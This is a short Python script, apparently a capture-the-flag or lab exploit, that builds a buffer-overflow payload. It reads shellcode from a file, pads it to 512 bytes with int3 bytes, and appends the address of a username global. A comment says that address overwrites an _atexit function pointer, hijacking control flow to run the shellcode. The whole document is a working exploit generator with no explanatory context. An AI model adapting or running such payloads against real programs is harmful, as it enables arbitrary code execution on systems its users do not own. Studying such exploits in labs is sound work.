import struct
import sys

with open('shell.bin', 'rb') as f:
    shellcode = f.read()

# pad with int3
s = shellcode.ljust(512, b'\xcc')
# addr of username global, gets written to _atexit func ptr
s += struct.pack('<I', 0x804a040)

sys.stdout.buffer.write(s)